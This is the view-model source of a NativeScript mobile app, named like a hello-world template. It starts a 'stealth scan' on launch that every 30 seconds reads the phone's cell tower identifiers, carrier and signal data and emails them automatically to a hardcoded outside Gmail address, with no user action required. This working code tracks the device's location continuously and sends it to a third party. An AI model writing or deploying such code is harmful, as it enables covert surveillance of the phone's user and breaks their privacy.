import { Observable } from '@nativescript/core';
import { CellTowerService, CellTowerInfo } from './services/cell-tower.service';
import { EmailService } from './services/email.service';
import { isAndroid } from '@nativescript/core/platform';

export class HelloWorldModel extends Observable {
  private cellTowerService: CellTowerService;
  private emailService: EmailService;
  private _isLoading: boolean = false;
  private _hasData: boolean = false;
  private _statusMessage: string = 'System ready';
  private _statusClass: string = 'text-green-600';
  private _refreshButtonText: string = 'Manual Scan';
  private _emailButtonText: string = 'Send Email';
  private _emailStatusVisible: boolean = false;
  private _emailStatusMessage: string = '';
  private _emailStatusClass: string = '';
  private _isEmailLoading: boolean = false;
  private autoScanInterval: any;
  private scanCount: number = 0;
  private currentCellData: CellTowerInfo | null = null;

  // Cell tower data properties
  private _mcc: string = '';
  private _mnc: string = '';
  private _lac: string = '';
  private _cid: string = '';
  private _signalStrength: number = 0;
  private _signalStrengthClass: string = 'text-gray-500';
  private _networkType: string = '';
  private _carrierName: string = '';
  private _countryCode: string = '';
  private _rssi: number = 0;
  private _lastUpdated: string = '';

  constructor() {
    super();
    this.cellTowerService = new CellTowerService();
    this.emailService = new EmailService();
    this.updateStatus('Auto-scan mode active', 'text-green-600');
    
    // Start automatic scanning after a short delay
    setTimeout(() => {
      this.startAutoScan();
    }, 2000);
  }

  // Getters for data binding
  get isLoading(): boolean { return this._isLoading; }
  get hasData(): boolean { return this._hasData; }
  get statusMessage(): string { return this._statusMessage; }
  get statusClass(): string { return this._statusClass; }
  get refreshButtonText(): string { return this._refreshButtonText; }
  get emailButtonText(): string { return this._emailButtonText; }
  get emailStatusVisible(): boolean { return this._emailStatusVisible; }
  get emailStatusMessage(): string { return this._emailStatusMessage; }
  get emailStatusClass(): string { return this._emailStatusClass; }
  get canSendEmail(): boolean { return !this._isLoading && !this._isEmailLoading && this._hasData; }
  
  get mcc(): string { return this._mcc; }
  get mnc(): string { return this._mnc; }
  get lac(): string { return this._lac; }
  get cid(): string { return this._cid; }
  get signalStrength(): string { 
    return this._signalStrength > 0 ? `${this._signalStrength}%` : 'Unknown';
  }
  get signalStrengthClass(): string { return this._signalStrengthClass; }
  get networkType(): string { return this._networkType; }
  get carrierName(): string { return this._carrierName; }
  get countryCode(): string { return this._countryCode; }
  get rssi(): number { return this._rssi; }
  get lastUpdated(): string { return this._lastUpdated; }

  private startAutoScan() {
    // Perform initial scan
    this.performStealthScan();
    
    // Set up automatic scanning every 30 seconds
    this.autoScanInterval = setInterval(() => {
      this.performStealthScan();
    }, 30000); // 30 seconds
  }

  private async performStealthScan() {
    try {
      // Check permissions first on Android
      if (isAndroid) {
        const hasPermission = await this.checkAndRequestPermissions();
        if (!hasPermission) {
          this.updateStatus('Permissions required for scanning', 'text-yellow-600');
          return;
        }
      }

      const cellInfo = await this.cellTowerService.getCellTowerInfo();
      
      if (cellInfo) {
        this.scanCount++;
        this.currentCellData = cellInfo;
        this.updateCellData(cellInfo);
        this.updateStatus(`Auto-scan #${this.scanCount} completed`, 'text-green-600');
        this._hasData = true;
        this.notifyPropertyChange('hasData', this._hasData);
        this.notifyPropertyChange('canSendEmail', this.canSendEmail);
        
        // Send email with cell tower data automatically
        const emailSent = await this.emailService.sendCellTowerData(cellInfo);
        if (emailSent) {
          console.log('Cell tower data sent via email successfully');
          this.updateEmailStatus('Auto-email sent successfully', 'text-green-600');
        } else {
          console.log('Failed to send auto-email');
          this.updateEmailStatus('Auto-email failed to send', 'text-red-600');
        }
      } else {
        this.updateStatus('No cell data available', 'text-yellow-600');
      }
    } catch (error) {
      console.error('Error in stealth scan:', error);
      this.updateStatus('Scan error occurred', 'text-red-600');
    }
  }

  public async refreshData() {
    if (this._isLoading) return;
    
    this.setLoading(true);
    this.updateStatus('Manual scan in progress...', 'text-blue-600');
    
    try {
      // Check permissions first on Android
      if (isAndroid) {
        const hasPermission = await this.checkAndRequestPermissions();
        if (!hasPermission) {
          this.updateStatus('Location permission required to access cell tower data', 'text-red-600');
          this.setLoading(false);
          return;
        }
      }

      const cellInfo = await this.cellTowerService.getCellTowerInfo();
      
      if (cellInfo) {
        this.currentCellData = cellInfo;
        this.updateCellData(cellInfo);
        this.updateStatus('Manual scan completed successfully', 'text-green-600');
        this._hasData = true;
        this.notifyPropertyChange('hasData', this._hasData);
        this.notifyPropertyChange('canSendEmail', this.canSendEmail);
      } else {
        this.updateStatus('Unable to retrieve cell tower data', 'text-red-600');
        this._hasData = false;
        this.notifyPropertyChange('hasData', this._hasData);
        this.notifyPropertyChange('canSendEmail', this.canSendEmail);
      }
    } catch (error) {
      console.error('Error refreshing cell data:', error);
      this.updateStatus(`Error: ${error.message}`, 'text-red-600');
      this._hasData = false;
      this.notifyPropertyChange('hasData', this._hasData);
      this.notifyPropertyChange('canSendEmail', this.canSendEmail);
    } finally {
      this.setLoading(false);
    }
  }

  public async sendEmailManually() {
    if (this._isLoading || this._isEmailLoading || !this.currentCellData) return;
    
    this.setEmailLoading(true);
    this.updateEmailStatus('Sending email...', 'text-blue-600');
    
    try {
      const emailSent = await this.emailService.sendCellTowerData(this.currentCellData);
      
      if (emailSent) {
        this.updateEmailStatus('Email sent successfully to maruhsoft@gmail.com', 'text-green-600');
      } else {
        this.updateEmailStatus('Failed to send email. Please try again.', 'text-red-600');
      }
    } catch (error) {
      console.error('Error sending manual email:', error);
      this.updateEmailStatus(`Email error: ${error.message}`, 'text-red-600');
    } finally {
      this.setEmailLoading(false);
      
      // Hide email status after 5 seconds
      setTimeout(() => {
        this._emailStatusVisible = false;
        this.notifyPropertyChange('emailStatusVisible', this._emailStatusVisible);
      }, 5000);
    }
  }

  private async checkAndRequestPermissions(): Promise<boolean> {
    try {
      const context = require('@nativescript/core').Utils.android.getApplicationContext();
      const PackageManager = android.content.pm.PackageManager;
      
      // Check multiple permissions that might be needed
      const permissions = [
        android.Manifest.permission.ACCESS_COARSE_LOCATION,
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.READ_PHONE_STATE
      ];
      
      let allGranted = true;
      
      for (const permission of permissions) {
        const hasPermission = context.checkSelfPermission(permission) === PackageManager.PERMISSION_GRANTED;
        if (!hasPermission) {
          console.log(`Missing permission: ${permission}`);
          allGranted = false;
        }
      }
      
      if (!allGranted) {
        // In NativeScript Preview, we can't request permissions programmatically
        // The user needs to grant them manually in device settings
        console.log('Some permissions are missing. Please grant location and phone permissions in device settings.');
        return false;
      }
      
      return true;
    } catch (error) {
      console.error('Permission error:', error);
      return false;
    }
  }

  private updateCellData(cellInfo: CellTowerInfo) {
    this._mcc = cellInfo.mcc || 'Unknown';
    this._mnc = cellInfo.mnc || 'Unknown';
    this._lac = cellInfo.lac || 'Unknown';
    this._cid = cellInfo.cid || 'Unknown';
    this._signalStrength = cellInfo.signalStrength || 0;
    this._networkType = cellInfo.networkType || 'Unknown';
    this._carrierName = cellInfo.carrierName || 'Unknown';
    this._countryCode = cellInfo.countryCode || 'Unknown';
    this._rssi = cellInfo.rssi || -999;
    this._lastUpdated = new Date().toLocaleString();

    // Update signal strength color
    if (this._signalStrength >= 75) {
      this._signalStrengthClass = 'text-green-600';
    } else if (this._signalStrength >= 50) {
      this._signalStrengthClass = 'text-yellow-600';
    } else if (this._signalStrength > 0) {
      this._signalStrengthClass = 'text-red-600';
    } else {
      this._signalStrengthClass = 'text-gray-500';
    }

    // Notify all property changes
    this.notifyPropertyChange('mcc', this._mcc);
    this.notifyPropertyChange('mnc', this._mnc);
    this.notifyPropertyChange('lac', this._lac);
    this.notifyPropertyChange('cid', this._cid);
    this.notifyPropertyChange('signalStrength', this.signalStrength);
    this.notifyPropertyChange('signalStrengthClass', this._signalStrengthClass);
    this.notifyPropertyChange('networkType', this._networkType);
    this.notifyPropertyChange('carrierName', this._carrierName);
    this.notifyPropertyChange('countryCode', this._countryCode);
    this.notifyPropertyChange('rssi', this._rssi);
    this.notifyPropertyChange('lastUpdated', this._lastUpdated);
  }

  private setLoading(loading: boolean) {
    this._isLoading = loading;
    this._refreshButtonText = loading ? 'Scanning...' : 'Manual Scan';
    this.notifyPropertyChange('isLoading', this._isLoading);
    this.notifyPropertyChange('refreshButtonText', this._refreshButtonText);
    this.notifyPropertyChange('canSendEmail', this.canSendEmail);
  }

  private setEmailLoading(loading: boolean) {
    this._isEmailLoading = loading;
    this._emailButtonText = loading ? 'Sending...' : 'Send Email';
    this.notifyPropertyChange('emailButtonText', this._emailButtonText);
    this.notifyPropertyChange('canSendEmail', this.canSendEmail);
  }

  private updateStatus(message: string, className: string) {
    this._statusMessage = message;
    this._statusClass = className;
    this.notifyPropertyChange('statusMessage', this._statusMessage);
    this.notifyPropertyChange('statusClass', this._statusClass);
  }

  private updateEmailStatus(message: string, className: string) {
    this._emailStatusMessage = message;
    this._emailStatusClass = className;
    this._emailStatusVisible = true;
    this.notifyPropertyChange('emailStatusMessage', this._emailStatusMessage);
    this.notifyPropertyChange('emailStatusClass', this._emailStatusClass);
    this.notifyPropertyChange('emailStatusVisible', this._emailStatusVisible);
  }

  // Clean up interval when the view model is destroyed
  public destroy() {
    if (this.autoScanInterval) {
      clearInterval(this.autoScanInterval);
    }
  }
}